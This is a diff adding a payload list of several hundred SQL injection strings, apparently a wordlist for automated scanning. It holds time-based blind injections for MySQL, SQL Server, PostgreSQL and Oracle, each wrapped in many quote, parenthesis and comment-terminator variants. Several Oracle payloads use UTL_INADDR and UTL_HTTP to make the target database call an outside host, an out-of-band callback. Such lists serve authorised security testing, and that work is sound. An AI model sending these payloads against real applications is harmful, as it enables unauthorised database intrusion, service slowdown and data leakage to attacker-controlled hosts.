@@ -1,0 +1,333 @@
++BENCHMARK(1000000,MD5('A'))
++SLEEP(5)
++WAITFOR DELAY '00:00:20'
++pg_sleep(10)
++UTL_INADDR.get_host_name('10.0.0.1')
++UTL_INADDR.get_host_address('5696d8f4.bzn.pw')
++UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')
++BENCHMARK(1000000,MD5('A'))   -- 
++BENCHMARK(1000000,MD5('A'))  /* 
++BENCHMARK(1000000,MD5('A')))   -- 
++BENCHMARK(1000000,MD5('A')))  /* 
++BENCHMARK(1000000,MD5('A'))))   -- 
++BENCHMARK(1000000,MD5('A'))))  /* 
++BENCHMARK(1000000,MD5('A')))))  -- 
++BENCHMARK(1000000,MD5('A'))))) /* 
++SLEEP(5)   -- 
++SLEEP(5)  /* 
++SLEEP(5))   -- 
++SLEEP(5))  /* 
++SLEEP(5)))   -- 
++SLEEP(5)))  /* 
++SLEEP(5))))  -- 
++SLEEP(5)))) /* 
++WAITFOR DELAY '00:00:20'   -- 
++WAITFOR DELAY '00:00:20'  /* 
++WAITFOR DELAY '00:00:20')   -- 
++WAITFOR DELAY '00:00:20')  /* 
++WAITFOR DELAY '00:00:20'))   -- 
++WAITFOR DELAY '00:00:20'))  /* 
++WAITFOR DELAY '00:00:20')))  -- 
++WAITFOR DELAY '00:00:20'))) /* 
++pg_sleep(10)   -- 
++pg_sleep(10)  /* 
++pg_sleep(10))   -- 
++pg_sleep(10))  /* 
++pg_sleep(10)))   -- 
++pg_sleep(10)))  /* 
++pg_sleep(10))))  -- 
++pg_sleep(10)))) /* 
++UTL_INADDR.get_host_name('10.0.0.1')   -- 
++UTL_INADDR.get_host_name('10.0.0.1')  /* 
++UTL_INADDR.get_host_name('10.0.0.1'))   -- 
++UTL_INADDR.get_host_name('10.0.0.1'))  /* 
++UTL_INADDR.get_host_name('10.0.0.1')))   -- 
++UTL_INADDR.get_host_name('10.0.0.1')))  /* 
++UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
++UTL_INADDR.get_host_name('10.0.0.1')))) /* 
++UTL_INADDR.get_host_address('5696d8f4.bzn.pw')   -- 
++UTL_INADDR.get_host_address('5696d8f4.bzn.pw')  /* 
++UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))   -- 
++UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))  /* 
++UTL_INADDR.get_host_address('5696d8f4.bzn.pw')))   -- 
++UTL_INADDR.get_host_address('5696d8f4.bzn.pw')))  /* 
++UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))))  -- 
++UTL_INADDR.get_host_address('5696d8f4.bzn.pw')))) /* 
++UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')   -- 
++UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')  /* 
++UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))   -- 
++UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))  /* 
++UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')))   -- 
++UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')))  /* 
++UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))))  -- 
++UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')))) /* 
+'+BENCHMARK(1000000,MD5('A'))+'a
+'+SLEEP(5)+'a
+'+WAITFOR DELAY '00:00:20'+'a
+'+pg_sleep(10)+'a
+'+UTL_INADDR.get_host_name('10.0.0.1')+'a
+'+UTL_INADDR.get_host_address('5696d8f4.bzn.pw')+'a
+'+UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')+'a
+'+BENCHMARK(1000000,MD5('A'))   -- 
+'+BENCHMARK(1000000,MD5('A'))  /* 
+'+BENCHMARK(1000000,MD5('A')))   -- 
+'+BENCHMARK(1000000,MD5('A')))  /* 
+'+BENCHMARK(1000000,MD5('A'))))   -- 
+'+BENCHMARK(1000000,MD5('A'))))  /* 
+'+BENCHMARK(1000000,MD5('A')))))  -- 
+'+BENCHMARK(1000000,MD5('A'))))) /* 
+'+SLEEP(5)   -- 
+'+SLEEP(5)  /* 
+'+SLEEP(5))   -- 
+'+SLEEP(5))  /* 
+'+SLEEP(5)))   -- 
+'+SLEEP(5)))  /* 
+'+SLEEP(5))))  -- 
+'+SLEEP(5)))) /* 
+'+WAITFOR DELAY '00:00:20'   -- 
+'+WAITFOR DELAY '00:00:20'  /* 
+'+WAITFOR DELAY '00:00:20')   -- 
+'+WAITFOR DELAY '00:00:20')  /* 
+'+WAITFOR DELAY '00:00:20'))   -- 
+'+WAITFOR DELAY '00:00:20'))  /* 
+'+WAITFOR DELAY '00:00:20')))  -- 
+'+WAITFOR DELAY '00:00:20'))) /* 
+'+pg_sleep(10)   -- 
+'+pg_sleep(10)  /* 
+'+pg_sleep(10))   -- 
+'+pg_sleep(10))  /* 
+'+pg_sleep(10)))   -- 
+'+pg_sleep(10)))  /* 
+'+pg_sleep(10))))  -- 
+'+pg_sleep(10)))) /* 
+'+UTL_INADDR.get_host_name('10.0.0.1')   -- 
+'+UTL_INADDR.get_host_name('10.0.0.1')  /* 
+'+UTL_INADDR.get_host_name('10.0.0.1'))   -- 
+'+UTL_INADDR.get_host_name('10.0.0.1'))  /* 
+'+UTL_INADDR.get_host_name('10.0.0.1')))   -- 
+'+UTL_INADDR.get_host_name('10.0.0.1')))  /* 
+'+UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
+'+UTL_INADDR.get_host_name('10.0.0.1')))) /* 
+'+UTL_INADDR.get_host_address('5696d8f4.bzn.pw')   -- 
+'+UTL_INADDR.get_host_address('5696d8f4.bzn.pw')  /* 
+'+UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))   -- 
+'+UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))  /* 
+'+UTL_INADDR.get_host_address('5696d8f4.bzn.pw')))   -- 
+'+UTL_INADDR.get_host_address('5696d8f4.bzn.pw')))  /* 
+'+UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))))  -- 
+'+UTL_INADDR.get_host_address('5696d8f4.bzn.pw')))) /* 
+'+UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')   -- 
+'+UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')  /* 
+'+UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))   -- 
+'+UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))  /* 
+'+UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')))   -- 
+'+UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')))  /* 
+'+UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))))  -- 
+'+UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')))) /* 
+(BENCHMARK(1000000,MD5('A')))
+(SLEEP(5))
+(WAITFOR DELAY '00:00:20')
+(pg_sleep(10))
+(UTL_INADDR.get_host_name('10.0.0.1'))
+(UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))
+(UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))
+(BENCHMARK(1000000,MD5('A')))   -- 
+(BENCHMARK(1000000,MD5('A')))  /* 
+(BENCHMARK(1000000,MD5('A'))))   -- 
+(BENCHMARK(1000000,MD5('A'))))  /* 
+(BENCHMARK(1000000,MD5('A')))))   -- 
+(BENCHMARK(1000000,MD5('A')))))  /* 
+(BENCHMARK(1000000,MD5('A'))))))  -- 
+(BENCHMARK(1000000,MD5('A')))))) /* 
+(SLEEP(5))   -- 
+(SLEEP(5))  /* 
+(SLEEP(5)))   -- 
+(SLEEP(5)))  /* 
+(SLEEP(5))))   -- 
+(SLEEP(5))))  /* 
+(SLEEP(5)))))  -- 
+(SLEEP(5))))) /* 
+(WAITFOR DELAY '00:00:20')   -- 
+(WAITFOR DELAY '00:00:20')  /* 
+(WAITFOR DELAY '00:00:20'))   -- 
+(WAITFOR DELAY '00:00:20'))  /* 
+(WAITFOR DELAY '00:00:20')))   -- 
+(WAITFOR DELAY '00:00:20')))  /* 
+(WAITFOR DELAY '00:00:20'))))  -- 
+(WAITFOR DELAY '00:00:20')))) /* 
+(pg_sleep(10))   -- 
+(pg_sleep(10))  /* 
+(pg_sleep(10)))   -- 
+(pg_sleep(10)))  /* 
+(pg_sleep(10))))   -- 
+(pg_sleep(10))))  /* 
+(pg_sleep(10)))))  -- 
+(pg_sleep(10))))) /* 
+(UTL_INADDR.get_host_name('10.0.0.1'))   -- 
+(UTL_INADDR.get_host_name('10.0.0.1'))  /* 
+(UTL_INADDR.get_host_name('10.0.0.1')))   -- 
+(UTL_INADDR.get_host_name('10.0.0.1')))  /* 
+(UTL_INADDR.get_host_name('10.0.0.1'))))   -- 
+(UTL_INADDR.get_host_name('10.0.0.1'))))  /* 
+(UTL_INADDR.get_host_name('10.0.0.1')))))  -- 
+(UTL_INADDR.get_host_name('10.0.0.1'))))) /* 
+(UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))   -- 
+(UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))  /* 
+(UTL_INADDR.get_host_address('5696d8f4.bzn.pw')))   -- 
+(UTL_INADDR.get_host_address('5696d8f4.bzn.pw')))  /* 
+(UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))))   -- 
+(UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))))  /* 
+(UTL_INADDR.get_host_address('5696d8f4.bzn.pw')))))  -- 
+(UTL_INADDR.get_host_address('5696d8f4.bzn.pw'))))) /* 
+(UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))   -- 
+(UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))  /* 
+(UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')))   -- 
+(UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')))  /* 
+(UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))))   -- 
+(UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))))  /* 
+(UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')))))  -- 
+(UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw'))))) /* 
+ ; BEGIN DBMS_LOCK.SLEEP(5); END;;  -- 
+ ; BEGIN DBMS_LOCK.SLEEP(5); END;; /* 
+ ; WAITFOR DELAY '00:00:20';  -- 
+ ; WAITFOR DELAY '00:00:20'; /* 
+ ; select BENCHMARK(1000000,MD5('A'));  -- 
+ ; select BENCHMARK(1000000,MD5('A')); /* 
+ ; select SLEEP(5);  -- 
+ ; select SLEEP(5); /* 
+ ; select WAITFOR DELAY '00:00:20';  -- 
+ ; select WAITFOR DELAY '00:00:20'; /* 
+ ; select pg_sleep(10);  -- 
+ ; select pg_sleep(10); /* 
+ ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+ ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+ ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual;  -- 
+ ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual; /* 
+ ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual;  -- 
+ ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual; /* 
+) ; BEGIN DBMS_LOCK.SLEEP(5); END;;  -- 
+) ; BEGIN DBMS_LOCK.SLEEP(5); END;; /* 
+) ; WAITFOR DELAY '00:00:20';  -- 
+) ; WAITFOR DELAY '00:00:20'; /* 
+) ; select BENCHMARK(1000000,MD5('A'));  -- 
+) ; select BENCHMARK(1000000,MD5('A')); /* 
+) ; select SLEEP(5);  -- 
+) ; select SLEEP(5); /* 
+) ; select WAITFOR DELAY '00:00:20';  -- 
+) ; select WAITFOR DELAY '00:00:20'; /* 
+) ; select pg_sleep(10);  -- 
+) ; select pg_sleep(10); /* 
+) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+) ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual;  -- 
+) ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual; /* 
+) ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual;  -- 
+) ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual; /* 
+)) ; BEGIN DBMS_LOCK.SLEEP(5); END;;  -- 
+)) ; BEGIN DBMS_LOCK.SLEEP(5); END;; /* 
+)) ; WAITFOR DELAY '00:00:20';  -- 
+)) ; WAITFOR DELAY '00:00:20'; /* 
+)) ; select BENCHMARK(1000000,MD5('A'));  -- 
+)) ; select BENCHMARK(1000000,MD5('A')); /* 
+)) ; select SLEEP(5);  -- 
+)) ; select SLEEP(5); /* 
+)) ; select WAITFOR DELAY '00:00:20';  -- 
+)) ; select WAITFOR DELAY '00:00:20'; /* 
+)) ; select pg_sleep(10);  -- 
+)) ; select pg_sleep(10); /* 
+)) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+)) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+)) ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual;  -- 
+)) ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual; /* 
+)) ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual;  -- 
+)) ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual; /* 
+))); BEGIN DBMS_LOCK.SLEEP(5); END;;  -- 
+))); BEGIN DBMS_LOCK.SLEEP(5); END;; /* 
+))); WAITFOR DELAY '00:00:20';  -- 
+))); WAITFOR DELAY '00:00:20'; /* 
+))); select BENCHMARK(1000000,MD5('A'));  -- 
+))); select BENCHMARK(1000000,MD5('A')); /* 
+))); select SLEEP(5);  -- 
+))); select SLEEP(5); /* 
+))); select WAITFOR DELAY '00:00:20';  -- 
+))); select WAITFOR DELAY '00:00:20'; /* 
+))); select pg_sleep(10);  -- 
+))); select pg_sleep(10); /* 
+))); select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+))); select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+))); select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual;  -- 
+))); select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual; /* 
+))); select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual;  -- 
+))); select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual; /* 
+' ; BEGIN DBMS_LOCK.SLEEP(5); END;;  -- 
+' ; BEGIN DBMS_LOCK.SLEEP(5); END;; /* 
+' ; WAITFOR DELAY '00:00:20';  -- 
+' ; WAITFOR DELAY '00:00:20'; /* 
+' ; select BENCHMARK(1000000,MD5('A'));  -- 
+' ; select BENCHMARK(1000000,MD5('A')); /* 
+' ; select SLEEP(5);  -- 
+' ; select SLEEP(5); /* 
+' ; select WAITFOR DELAY '00:00:20';  -- 
+' ; select WAITFOR DELAY '00:00:20'; /* 
+' ; select pg_sleep(10);  -- 
+' ; select pg_sleep(10); /* 
+' ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+' ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+' ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual;  -- 
+' ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual; /* 
+' ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual;  -- 
+' ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual; /* 
+') ; BEGIN DBMS_LOCK.SLEEP(5); END;;  -- 
+') ; BEGIN DBMS_LOCK.SLEEP(5); END;; /* 
+') ; WAITFOR DELAY '00:00:20';  -- 
+') ; WAITFOR DELAY '00:00:20'; /* 
+') ; select BENCHMARK(1000000,MD5('A'));  -- 
+') ; select BENCHMARK(1000000,MD5('A')); /* 
+') ; select SLEEP(5);  -- 
+') ; select SLEEP(5); /* 
+') ; select WAITFOR DELAY '00:00:20';  -- 
+') ; select WAITFOR DELAY '00:00:20'; /* 
+') ; select pg_sleep(10);  -- 
+') ; select pg_sleep(10); /* 
+') ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+') ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+') ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual;  -- 
+') ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual; /* 
+') ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual;  -- 
+') ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual; /* 
+')) ; BEGIN DBMS_LOCK.SLEEP(5); END;;  -- 
+')) ; BEGIN DBMS_LOCK.SLEEP(5); END;; /* 
+')) ; WAITFOR DELAY '00:00:20';  -- 
+')) ; WAITFOR DELAY '00:00:20'; /* 
+')) ; select BENCHMARK(1000000,MD5('A'));  -- 
+')) ; select BENCHMARK(1000000,MD5('A')); /* 
+')) ; select SLEEP(5);  -- 
+')) ; select SLEEP(5); /* 
+')) ; select WAITFOR DELAY '00:00:20';  -- 
+')) ; select WAITFOR DELAY '00:00:20'; /* 
+')) ; select pg_sleep(10);  -- 
+')) ; select pg_sleep(10); /* 
+')) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+')) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+')) ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual;  -- 
+')) ; select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual; /* 
+')) ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual;  -- 
+')) ; select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual; /* 
+'))); BEGIN DBMS_LOCK.SLEEP(5); END;;  -- 
+'))); BEGIN DBMS_LOCK.SLEEP(5); END;; /* 
+'))); WAITFOR DELAY '00:00:20';  -- 
+'))); WAITFOR DELAY '00:00:20'; /* 
+'))); select BENCHMARK(1000000,MD5('A'));  -- 
+'))); select BENCHMARK(1000000,MD5('A')); /* 
+'))); select SLEEP(5);  -- 
+'))); select SLEEP(5); /* 
+'))); select WAITFOR DELAY '00:00:20';  -- 
+'))); select WAITFOR DELAY '00:00:20'; /* 
+'))); select pg_sleep(10);  -- 
+'))); select pg_sleep(10); /* 
+'))); select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+'))); select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+'))); select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual;  -- 
+'))); select UTL_INADDR.get_host_address('5696d8f4.bzn.pw') from dual; /* 
+'))); select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual;  -- 
+'))); select UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw') from dual; /* 
